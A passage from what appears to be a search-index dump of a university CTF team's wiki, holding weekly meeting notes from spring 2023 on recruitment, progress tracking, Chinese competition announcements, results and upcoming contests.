<p>\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u51b3\u8d5b\u671f\u95f4\u4e3e\u884c\u7684\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u521b\u65b0\u521b\u4e1a\u53d1\u5c55\u8bba\u575b\u5c06\u9762\u5411\u5168\u56fd\u9ad8\u6821\u5e08\u751f\u3001\u4f01\u4e8b\u4e1a\u5355\u4f4d\u4e0e\u4e2a\u4eba\u3002</p> <p>\u4e09\u3001\u53c2\u8d5b\u65b9\u5f0f</p> <p>\u6839\u636e\u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u7ae0\u7a0b\u300b\u548c\u300a2022\u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u2014\u4f5c\u54c1\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u8981\u6c42\uff0c\u5177\u4f53\u4e8b\u5b9c\u8be6\u89c1\u7ade\u8d5b\u7f51\u7ad9\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#0x2-new-member-recruitment","title":"0x2. New Member Recruitment","text":"<p>The recruitment pattern for new members this semester is</p> <ol> <li> <p>three-week online learning of basic content, with records, kept through Tencent meetings and video recording and used for future basic content review teaching.</p> </li> <li> <p>a two-day assessment session in the format of Jeopardy, which will be conducted using the COMPASS tournament platform.</p> </li> </ol> <p>The number of new members recruited this semester is about 5.</p> <p>The basics and tutorials are posted on our wiki page currently. More contents are under design.</p> <ul> <li>CTF Introduction and the Hacker Attitude</li> <li>Linux OS Installation and Basics</li> <li>Python Programming Quick Guide - Installation and Basic IO</li> <li>Python Programming Quick Guide - Syntax</li> <li>Python Programming Quick Guide - Functions</li> <li>Forensics</li> <li>Cryptography</li> <li>Docker for beginners</li> </ul>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#0x3-competition-and-events","title":"0x3. Competition and Events","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_3","title":"\u6570\u5b57\u4e2d\u56fd\u00b7\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u89e3\u51b3\u65b9\u6848\u521b\u65b0\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u672c\u8d5b\u9053\u4ee5\u5207\u5b9e\u89e3\u6c7a\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u4e2d\u7684\u5b9e\u9645\u95ee\u9898\u4e3a\u76ee\u6807\uff0e\u6709\u529b\u63a8\u52a8\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\uff0c\u53d1\u6325\u6570\u636e\u5b89\u5168\u6280\u672f\u521b\u65b0\u3001\u6210\u679c\u8f6c\u5316\u3001\u4eba\u624d\u57f9\u517b\u7b49\u5178\u578b\u793a\u8303\u5e26\u52a8\u4f5c\u7528\u3001\u63a8\u5e7f\u4f18\u79c0\u7ecf\u9a8c\u548c\u6210\u679c\uff0c\u52a9\u529b\u6211\u56fd\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_4","title":"\u6bd4\u8d5b\u94fe\u63a5","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1ahttps://www.dcic-china.com/competitions/10078</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_5","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2023-03-27 00:00:00 - 2023-04-07 00:00:00</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_6","title":"\u8d5b\u4e8b\u673a\u6784","text":"<p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u798f\u5efa\u7701\u901a\u4fe1\u7ba1\u7406\u5c40</p> <p>\u6307\u5bfc\u5355\u4f4d\uff1a\u6570\u5b57\u4e2d\u56fd\u5efa\u8bbe\u5cf0\u4f1a\u7ec4\u59d4\u4f1a</p> <p>\u627f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u7535\u5b50\u4fe1\u606f\u4ea7\u4e1a\u53d1\u5c55\u7814\u7a76\u9662\u3001\u4e2d\u56fd\u8f6f\u4ef6\u8bc4\u6d4b\u4e2d\u5fc3\u3001\u5de5\u4e1a\u548c\u4fe1\u606f\u5316\u90e8\u6559\u80b2\u4e0e\u8003\u8bd5\u4e2d\u5fc3</p> <p>\u534f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u8ba1\u7b97\u673a\u884c\u4e1a\u534f\u4f1a\u6570\u636e\u5b89\u5168\u4e13\u4e1a\u59d4\u5458\u4f1a\u3001\u5317\u4eac\u6c38\u4fe1\u81f3\u8bda\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8</p> <p>\u652f\u6301\u5355\u4f4d\uff1a\u8682\u8681\u96c6\u56e2\u3001\u4e2d\u5b5a\u4fe1\u606f\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001360\u6570\u5b57\u5b89\u5168\u79d1\u6280\u96c6\u56e2\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u957f\u4ead\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u817e\u8baf\u4e91\u8ba1\u7b97\uff08\u5317\u4eac\uff09\u6709\u9650\u8d23\u4efb\u516c\u53f8\u3001\u8fdc\u6c5f\u76db\u90a6\uff08\u5317\u4eac\uff09\u7f51\u7edc\u5b89\u5168\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u4f17\u5b89\u5929\u4e0b\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u65f6\u4ee3\u65b0\u5a01\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_7","title":"\u6bd4\u8d5b\u5f62\u5f0f","text":"<p>\u521b\u65b0\u8d5b\u91c7\u7528\u516c\u5f00\u5f0f\u7ade\u8d5b\uff0c\u56f4\u7ed5\u6570\u636e\u5b89\u5168\u6cbb\u7406\uff0c\u53c2\u8d5b\u5355\u4f4d\u63d0\u4ea4\u5b9e\u8df5\u6848\u4f8b\u3002\u8d5b\u4e8b\u5206\u9884\u8d5b\u548c\u51b3\u8d5b\u3002\u9884\u8d5b\u9636\u6bb5\u4e13\u5bb6\u7ec4\u8bc4\u59d4\u5c06\u91c7\u53d6\u8fdc\u7a0b\u767b\u5f55\u6216\u672c\u5730\u5b89\u88c5\u7684\u65b9\u5f0f\u8fd0\u884c\u53c2\u8d5b\u4f5c\u54c1\uff0c\u4f9d\u636e\u8d5b\u4e8b\u4e13\u5bb6\u5236\u5b9a\u7684\u6bd4\u8d5b\u8bc4\u5ba1\u6807\u51c6\u8fdb\u884c\u6253\u5206\uff0c\u6839\u636e\u5f97\u5206\u6392\u540d\u786e\u5b9a\u51b3\u8d5b\u540d\u5355\u3002\u51b3\u8d5b\u91c7\u7528\u7b54\u8fa9\u7684\u5f62\u5f0f\uff0c\u7531\u8d5b\u4e8b\u4e13\u5bb6\u7ec4\u5bf9\u9884\u8d5b\u5165\u56f4\u65b9\u6848\u8fdb\u884c\u8bc4\u5ba1\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_8","title":"\u6570\u5b57\u4e2d\u56fd\u00b7\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u4eba\u624d\u80fd\u529b\u6311\u6218\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u672c\u8d5b\u9053\u4ee5\u5207\u5b9e\u89e3\u6c7a\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u4e2d\u7684\u5b9e\u9645\u95ee\u9898\u4e3a\u76ee\u6807\uff0e\u6709\u529b\u63a8\u52a8\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\uff0c\u53d1\u6325\u6570\u636e\u5b89\u5168\u6280\u672f\u521b\u65b0\u3001\u6210\u679c\u8f6c\u5316\u3001\u4eba\u624d\u57f9\u517b\u7b49\u5178\u578b\u793a\u8303\u5e26\u52a8\u4f5c\u7528\u3001\u63a8\u5e7f\u4f18\u79c0\u7ecf\u9a8c\u548c\u6210\u679c\uff0c\u52a9\u529b\u6211\u56fd\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_9","title":"\u6bd4\u8d5b\u94fe\u63a5","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1a\u6682\u65e0</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_10","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2023-03-06 00:00:00 - 2023-03-22 00:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2023-04-01 00:00:00 - 2023-04-01 00:00:00</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_11","title":"\u8d5b\u4e8b\u673a\u6784","text":"<p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u798f\u5efa\u7701\u901a\u4fe1\u7ba1\u7406\u5c40</p> <p>\u6307\u5bfc\u5355\u4f4d\uff1a\u6570\u5b57\u4e2d\u56fd\u5efa\u8bbe\u5cf0\u4f1a\u7ec4\u59d4\u4f1a</p> <p>\u627f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u7535\u5b50\u4fe1\u606f\u4ea7\u4e1a\u53d1\u5c55\u7814\u7a76\u9662\u3001\u4e2d\u56fd\u8f6f\u4ef6\u8bc4\u6d4b\u4e2d\u5fc3\u3001\u5de5\u4e1a\u548c\u4fe1\u606f\u5316\u90e8\u6559\u80b2\u4e0e\u8003\u8bd5\u4e2d\u5fc3</p> <p>\u534f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u8ba1\u7b97\u673a\u884c\u4e1a\u534f\u4f1a\u6570\u636e\u5b89\u5168\u4e13\u4e1a\u59d4\u5458\u4f1a\u3001\u5317\u4eac\u6c38\u4fe1\u81f3\u8bda\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8</p> <p>\u652f\u6301\u5355\u4f4d\uff1a\u8682\u8681\u96c6\u56e2\u3001\u4e2d\u5b5a\u4fe1\u606f\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001360\u6570\u5b57\u5b89\u5168\u79d1\u6280\u96c6\u56e2\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u957f\u4ead\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u817e\u8baf\u4e91\u8ba1\u7b97\uff08\u5317\u4eac\uff09\u6709\u9650\u8d23\u4efb\u516c\u53f8\u3001\u8fdc\u6c5f\u76db\u90a6\uff08\u5317\u4eac\uff09\u7f51\u7edc\u5b89\u5168\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u4f17\u5b89\u5929\u4e0b\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u65f6\u4ee3\u65b0\u5a01\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_12","title":"\u6bd4\u8d5b\u5f62\u5f0f","text":"<p>\u7531\u7406\u8bba\u77e5\u8bc6\u548c\u6280\u80fd\u64cd\u4f5c\u4e24\u90e8\u5206\u7ec4\u6210\u3002\u7406\u8bba\u90e8\u5206\u6db5\u76d6\u653f\u7b56\u6cd5\u89c4\u548c\u6570\u636e\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\uff1b\u6280\u80fd\u64cd\u4f5c\u90e8\u5206\u6db5\u76d6\u6570\u636e\u8bc6\u522b\u3001\u6743\u9650\u63a7\u5236\u3001\u8106\u5f31\u6027\u5206\u6790\u7b49\u65b9\u5411\uff0c\u7efc\u5408\u8003\u5bdf\u53c2\u8d5b\u8005\u4e0d\u540c\u7ef4\u5ea6\u7684\u6570\u636e\u5b89\u5168\u80fd\u529b\u6c34\u5e73\u3002</p> <p>\u3010\u5b89\u6052\u4fe1\u606f\u3011\u4eb2\u7231\u7684\u53c2\u8d5b\u9009\u624b\uff0c\u60a8\u597d\uff01\u60a8\u62a5\u540d\u7684\u201c2023\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b-\u6570\u5b57\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u6311\u6218\u8d5b\u201d\u5c06\u4e8e2023\u5e743\u670824\u65e5\u8fdb\u884c\uff0c\u8bf7\u60a8\u6309\u65f6\u53c2\u52a0\u3002 \u6bd4\u8d5b\u5730\u5740\uff1ahttps://szzg2023.dasctf.com \u6bd4\u8d5b\u8d26\u53f7\uff1aaq#\u62a5\u540d\u7684\u624b\u673a\u53f7\u540e\u4e03\u4f4d \u6bd4\u8d5b\u5bc6\u7801\uff1aDas#\u624b\u673a\u53f7\u540e\u56db\u4f4d\uff0c\u5982\uff1aDas#1234 \u6bd4\u8d5b\u65f6\u95f4\uff1a\u4e0b\u534813:00-17:00 \u6ce8\u610f\u4e8b\u9879\uff1a\u63a8\u8350\u4f7f\u7528Chrome\u6216\u706b\u72d0\u6d4f\u89c8\u5668\uff0c\u5e76\u8bbe\u7f6e\u5141\u8bb8\u5f39\u51fa\u7a97\u53e3\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#wrap-up","title":"Wrap-up","text":"<p>Last week we officially started the recruitment program, and the program is going very well, we have more than 20 new students who are learning the basic content tutorials, and when the basic content teaching is completed, April 8 and 9 will be tested. We are also looking forward to the participation of the varsity students in this week's training, which will be an introduction to the Ether and Solidity languages (blockchain).</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/","title":"CTF Week Meeting 2023-04-06","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 60%</li> <li>CTFtime program: play CTF and share - 23%</li> <li>New Member Recruitment - 50%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 63%</li> <li>CTF from Practice to Principle - 3%</li> <li>National College Student Information Security Contest - 20%</li> <li>Wangding Cup Semi-Final Competition - 50%</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 5%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Wangding Cup Arrangement.</li> <li>Guangdong Province 2nd CTF Arrangement.</li> <li>Skip the Training this week.</li> <li>Upcoming Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/#0x1-wangding-cup-arrangement","title":"0x1. Wangding Cup Arrangement","text":"<p>\u3010\u91cd\u8981\u901a\u77e5\u30112022\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u534a\u51b3\u8d5b\u3001\u603b\u51b3\u8d5b\u53ca\u9881\u5956\u5178\u793c\u76f8\u5173\u5b89\u6392</p> <p>\u5404\u53c2\u8d5b\u9009\u624b\u53ca\u76f8\u5173\u5355\u4f4d\uff1a</p> <p>2022\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u534a\u51b3\u8d5b\u5c06\u4e8e4\u670814\u65e5\u6b63\u5f0f\u5f00\u5e55\uff0c\u73b0\u5c06\u6bd4\u8d5b\u671f\u95f4\u65e5\u7a0b\u5b89\u6392\u53ca\u6ce8\u610f\u4e8b\u9879\u901a\u77e5\u5982\u4e0b\uff0c\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u9605\u8bfb\u5e76\u4e25\u683c\u9075\u5b88\uff1a</p> <p>\u4e00\u3001\u65e5\u7a0b\u5b89\u6392</p> <p>(\u7565)</p> <p>\u4e8c\u3001\u9152\u5e97\u63a8\u8350</p> <p>(\u7565)</p> <p>1.\u4ee5\u4e0a\u4e3a\u5927\u8d5b\u7ec4\u59d4\u4f1a\u63a8\u8350\u9152\u5e97\uff0c\u8bf7\u53c2\u8d5b\u9009\u624b\u4f9d\u636e\u81ea\u8eab\u60c5\u51b5\u81ea\u884c\u8054\u7cfb\u9152\u5e97\u8fdb\u884c\u9884\u5b9a\uff0c\u8054\u7cfb\u7535\u8bdd\u8be6\u89c1\u4e0a\u8ff0\u8868\u683c\u5185\u5bb9\u3002</p> <p>2.\u9884\u5b9a\u65f6\uff0c\u62a5\u201c\u7f51\u9f0e\u676f\u53c2\u8d5b\u9009\u624b\u201d\uff0c\u53ef\u4eab\u53d7\u534f\u8bae\u4ef7\u683c\u3002</p> <p>3.\u8d5b\u4e8b\u6d3b\u52a8\u671f\u95f4\u5165\u4f4f\u9700\u6c42\u91cf\u8f83\u5927\uff0c\u9152\u5e97\u623f\u6e90\u7d27\u5f20\uff0c\u8bf7\u5404\u4f4d\u53c2\u8d5b\u9009\u624b\u5c3d\u91cf\u57284\u67087\u65e5\u524d\u5b8c\u6210\u4f4f\u5bbf\u9884\u8ba2\u3002</p> <p>4.\u5927\u8d5b\u671f\u95f4\uff0c\u7ec4\u59d4\u4f1a\u5c06\u5728\u63a8\u8350\u9152\u5e97\u9644\u8fd1\u5b89\u6392\u63a5\u9a73\u73ed\u8f66\uff0c\u63a5\u9001\u9009\u624b\u5f80\u8fd4\u8d5b\u573a\u3002</p> <p>5.\u82e5\u5404\u53c2\u8d5b\u9009\u624b\u9700\u8981\u5f00\u5177\u53d1\u7968\uff0c\u8bf7\u81ea\u884c\u4e0e\u9152\u5e97\u534f\u5546\u3002</p> <p>\u6ce8* \u5176\u4e2d\u4eb2\u6a59\u5ba2\u6808\u53ea\u80fd\u63d0\u4f9b\u201c\u57f9\u8bad\u53d1\u7968\u201d\uff0c\u8bf7\u5404\u53c2\u8d5b\u9009\u624b\u7559\u610f\u3002</p> <p>\u4e09\u3001\u6ce8\u610f\u4e8b\u9879</p> <p>1.\u8bf7\u5404\u53c2\u8d5b\u9009\u624b\u505a\u597d\u4e2a\u4eba\u9632\u62a4\u548c\u4ea4\u901a\u4f4f\u5bbf\u5b89\u6392\uff0c\u4ee5\u4fdd\u8bc1\u53c2\u8d5b\u987a\u5229\u3002\u8bf7\u5404\u53c2\u8d5b\u9009\u624b\u63d0\u524d\u51c6\u5907\u597d\u4e2a\u4eba\u53c2\u8d5b\u5de5\u5177\uff08\u7b14\u8bb0\u672c\u7535\u8111\u3001\u6709\u7ebf\u9f20\u6807\u3001\u6709\u7ebf\u952e\u76d8\u3001U\u76d8\u548c\u7f51\u53e3\u8f6c\u63a5\u5668\u7b49\uff09\uff0c\u4ee5\u53ca\u81ea\u5df1\u719f\u6089\u7684\u53c2\u8d5b\u73af\u5883\u548c\u5e38\u7528\u8f6f\u4ef6\u3001\u5de5\u5177\u3001\u811a\u672c\u7b49\u3002</p> <p>2.\u8bf7\u5404\u4f4d\u53c2\u8d5b\u9009\u624b\u63d0\u524d\u51c6\u5907\u597d\u7b7e\u5230\u6750\u6599 \uff0c</p> <p>\u8be6\u7ec6\u8bf4\u660e\u8bf7\u53c2\u89c1\u7f51\u9f0e\u676f\u5b98\u7f51\uff08https://www.wangdingcup.com\uff09\u6216\u7f51\u9f0e\u676f\u5b98\u65b9\u516c\u4f17\u53f7\uff08\u516c\u4f17\u53f7\u540d\uff1a\u7f51\u9f0e\u676f\uff0c\u516c\u4f17\u53f7ID\uff1awangdingcup\uff09\u53d1\u5e03\u7684\u300a2022\u5e74\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u534a\u51b3\u8d5b\u3001\u603b\u51b3\u8d5b\u53ca\u9881\u5956\u5178\u793c\u5b89\u6392\u901a\u77e5\u300b\u4e2d\u9644\u4ef6\u4e00\u5185\u5bb9\u3002</p> <p>3.\u6bd4\u8d5b\u5f53\u5929\u6240\u6709\u53c2\u8d5b\u9009\u624b\u987b\u643a\u5e26\u8eab\u4efd\u8bc1\u539f\u4ef6\u548c\u53c2\u8d5b\u8bc1\u524d\u5f80\u6bd4\u8d5b\u73b0\u573a\u3002</p> <p>\u6ce8* \u8fdf\u5230\u8d85\u534a\u5c0f\u65f6\u5c06\u88ab\u7981\u6b62\u5165\u573a\u3002</p> <p>4.\u6bcf\u4f4d\u53c2\u8d5b\u9009\u624b\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4ec5\u5141\u8bb8\u4f7f\u7528\u4e00\u53f0\u7b14\u8bb0\u672c\u7535\u8111\u7b54\u9898\uff0c\u7981\u6b62\u4f7f\u7528\u670d\u52a1\u5668\u7b49\u5927\u529f\u7387\u8bbe\u5907\u3002\u5982\u9700\u4f7f\u7528nuc\u7c7b\u8ff7\u4f60\u4e3b\u673a\uff0c\u6bcf\u961f\u9650\u5236\u6570\u91cf\u4e0d\u8d85\u8fc71\u53f0\u3002</p> <p>5.\u5982\u6709\u5176\u4ed6\u95ee\u9898\uff0c\u53ef\u62e8\u6253\u7ec4\u59d4\u4f1a\u5de5\u4f5c\u7535\u8bdd\uff1a010-50873883\u3002\u7edf\u4e00\u5de5\u4f5c\u65f6\u95f4\uff1a\u5de5\u4f5c\u65e510:00\u81f318:00\u3002</p> <p>\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u7ec4\u59d4\u4f1a</p> <p>2023\u5e744\u6708</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/#0x2-guangdong-province-2nd-ctf-arrangement","title":"0x2. Guangdong Province 2nd CTF Arrangement","text":"<p>\u5173\u4e8e\u505a\u597d\u7b2c\u4e8c\u5c4a\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b\u603b\u51b3\u8d5b\u98df\u5bbf\u5b89\u6392\u7684\u901a\u77e5</p> <p>(\u89c1\u9644\u4ef6)</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/#0x3-skip-the-training-this-week","title":"0x3. Skip the Training this week","text":"<p>The meeting started with a discussion about the upcoming mid-term exams, which many members of the group are preparing for. The group acknowledged that these exams are an important priority and require significant preparation time and effort. Several members expressed concern that they could not attend the training sessions over the weekend due to their exam preparation.</p> <p>After some discussion, it was proposed that the group skip training for the upcoming weekend to allow members to focus on their exams. The group discussed the potential impact of missing one training weekend and weighed the decision's pros and cons. Ultimately, it was decided that the benefits of allowing members to fully focus on their exams outweighed the potential negative impact of missing one weekend of training.</p> <p>The group agreed that skipping training for the upcoming weekend was the best decision to allow members to focus on their mid-term exams. The decision was made after a thorough discussion and weighing of the potential impact on the group's training goals. The group will continue to monitor the situation and make adjustments as necessary to ensure that they stay on track with their training.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-06/#wrap-up","title":"Wrap-up","text":"<p>During the meeting, several topics were discussed, including the arrangements for the Wangding Cup and the second Guangdong Province CTF. It was decided that the group would focus on preparing for these events in the coming weeks.</p> <p>Additionally, it was mentioned that there would be a skip in training for the upcoming weekend. This decision was made to allow members of the group to focus on their personal commitments and responsibilities.</p> <p>Overall, the meeting was productive and focused on upcoming events and important scheduling decisions.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/","title":"CTF Week Meeting 2023-04-20","text":"<p>I want to thank each and every one of you for taking the time to join us today. Your expertise and commitment to this critical area of our competition are essential to our success. I am confident that together we can address any challenges that come our way and ensure the ongoing security of our team.</p> <p>Let's get started and make the most of this opportunity to share knowledge, ideas, and insights.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 60%</li> <li>CTFtime program: play CTF and share - 28%</li> <li>New Member Recruitment - 50%</li> <li>Remedial content session - 72%</li> <li>CTF from Practice to Principle - 15%</li> <li>National College Student Information Security Contest - 30%</li> <li>Wangding Cup Semi-Final Competition - 100%</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 15%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Wangding Cup News.</li> <li>Guangdong Province 2nd CTF News.</li> <li>Upcoming Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/#0x1-wangding-cup-news","title":"0x1. Wangding Cup News","text":"<p>Congratulations to the team for achieving an outstanding performance in the Wangding Cup cybersecurity competition! Our team's dedication and hard work have paid off, earning us the 21st place in the Green Dragon Group and the 51st place in the general scoreboard in the semi-final.</p> <p>Making it to the semi-finals of such a prestigious competition is an incredible accomplishment, and I am proud of your achievements. Your teamwork, problem-solving skills, and technical expertise have all contributed to this success, and I hope that this experience has been a valuable learning opportunity for all of you.</p> <p>As you move forward from this competition, it's important to remember that there is always room for improvement. While you have achieved great success, there are always areas where you can continue to grow and develop. Whether it's through refining your technical skills or strengthening your teamwork and communication, there are many ways to build upon your success and continue to achieve great things in the future.</p> <p>I am excited to see where your team goes from here, and I wish you all the best in your future endeavors. Congratulations again on this impressive achievement!</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/#0x2-guangdong-province-2nd-ctf-news","title":"0x2. Guangdong Province 2nd CTF News","text":"<p>Congratulations to the winning team of the Guangdong Province University Cybersecurity Competition! The competition was intense, with 502 teams from across the province competing for the top spot, but our team emerged victorious and took home the 1st place trophy.</p> <p>The success is a testament to your dedication, hard work, and expertise in the field of cybersecurity. The team's ability to tackle complex challenges and overcome obstacles is truly impressive, and you have set an outstanding example for your peers in the industry.</p> <p>I commend the team for your remarkable achievement and wish you continued success in all your future endeavors. Your win is not only a source of pride for your university but also for the entire province. Congratulations again on this amazing accomplishment!</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/#0x3-upcoming-events","title":"0x3. Upcoming Events","text":"<p>QQ Group: 734535934</p> <p>1 2023\u5e74\u7b2c\u4e03\u5c4a\u201c\u5fa1\u7f51\u676f\u201d\u4fe1\u606f\u5b89\u5168\u5927\u8d5b 2 \u7b2c\u4e03\u5c4a\u201c\u5f3a\u7f51\u676f\u201d\u5168\u56fd\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b 3 2023\u6625\u79cb\u676f\u6625\u5b63\u8d5b 4 ISCC2023\u4e2a\u4eba\u6311\u6218\u8d5b 5 \u963f\u91cc\u4e91CTF 6 \u3010\u6625\u79cb\u4e91\u955c\u3011\u5185\u7f51\u6781\u9650\u6311\u6218\u8d5b 7 \u66f4\u591a\u56fd\u5916\u8d5b\u4e8b\u5173\u6ce8CTFTIME 8 AntCTF X D^3CTF 2023\u9884\u70ed\u8d5b 9 2023DASCTF X SU\u56db\u6708\u6625\u5b63\u6311\u6218\u8d5b 10 \u201c\u5929\u4e00\u6c38\u5b89\u676f\u201d2023\u5b81\u6ce2\u5e02\u7b2c\u516d\u5c4a\u7f51\u7edc\u5b89\u5168\u5927\u8d5b 11 AntCTF X D^3CTF 12 \u5b89\u5168\u7cbe\u82f1\u9009\u62d4\u8d5b 13 2023LitCTF&amp;\u90d1\u5dde\u8f7b\u5de5\u4e1a\u5927\u5b66\u9996\u5c4a\u65b0\u751f\u8d5b 14 2023\u5e74\u7b2c\u4e03\u5c4a\u91d1\u7816\u5927\u8d5b\u2014\u2014\u7f51\u7edc\u5b89\u5168\u5728\u4f01\u4e1a\u4fe1\u606f\u7ba1\u7406\u4e2d\u7684\u5e94\u7528 15 2023\u7b2c\u4e03\u5c4a\u91d1\u7816\u5927\u8d5b\u2014\u2014\u5176\u5b83\u6bd4\u8d5b 16 2023\u5e74\u7b2c\u4e03\u5c4a\u91d1\u7816\u5927\u8d5b\u2014\u2014\u4f01\u4e1a\u4fe1\u606f\u7cfb\u7edf\u5b89\u5168 17 \u7b2c\u5341\u56db\u5c4a\u84dd\u6865\u676f\u5927\u8d5b\u6570\u5b57\u79d1\u6280\u521b\u65b0\u8d5b\u2014\u7f51\u7edc\u5b89\u5168\u6625\u79cb\u6311\u6218\u8d5b 18 \u201c\u76d8\u53e4\u77f3\u676f\u201d\u5168\u56fd\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u5927\u8d5b 19 HDCTF2023 \u6d77\u5357\u5927\u5b66\u7b2c\u56db\u5c4a\u7f51\u7edc\u5b89\u5168\u6280\u80fd \u6311\u6218\u8d5b 20 \u7b2c\u56db\u5c4a\u201c\u957f\u57ce\u676f\u201d\u4fe1\u606f\u5b89\u5168\u94c1\u4eba\u4e09\u9879\u8d5b\u603b\u51b3\u8d5b 21 \u6570\u5b57\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u6311\u6218\u8d5b\u51b3\u8d5b 22 \u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u4eba\u624d\u80fd\u529b\u6311\u6218\u8d5b\u51b3\u8d5b 23 